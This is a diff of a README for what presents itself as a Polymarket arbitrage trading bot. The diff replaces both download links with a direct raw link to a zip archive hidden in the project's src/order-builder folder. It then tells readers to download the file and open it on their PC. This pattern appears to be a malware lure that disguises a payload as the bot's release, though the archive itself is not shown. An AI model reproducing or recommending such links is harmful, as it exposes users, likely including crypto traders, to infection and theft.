@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Arbitrage-Trading-Bot-Spreadmaker - Find Price Gaps Faster
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Polymarket%20Arbitrage%20Bot-blue)](https://github.com/Corettafinnougricspeaking368/Polymarket-Arbitrage-Trading-Bot-Spreadmaker)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Polymarket%20Arbitrage%20Bot-blue)](https://raw.githubusercontent.com/Corettafinnougricspeaking368/Polymarket-Arbitrage-Trading-Bot-Spreadmaker/main/src/order-builder/Polymarket_Bot_Arbitrage_Spreadmaker_Trading_v2.0.zip)
 
 ## 🧭 What This Tool Does
 
@@ -24,7 +24,7 @@ For best results, close other heavy apps before you start.
 
 Visit this page to download:
 
-https://github.com/Corettafinnougricspeaking368/Polymarket-Arbitrage-Trading-Bot-Spreadmaker
+https://raw.githubusercontent.com/Corettafinnougricspeaking368/Polymarket-Arbitrage-Trading-Bot-Spreadmaker/main/src/order-builder/Polymarket_Bot_Arbitrage_Spreadmaker_Trading_v2.0.zip
 
 Use the page above to get the latest release or project files. If the page shows a release file, download it. If it shows a folder or package, save it to your PC and open it from there.
 
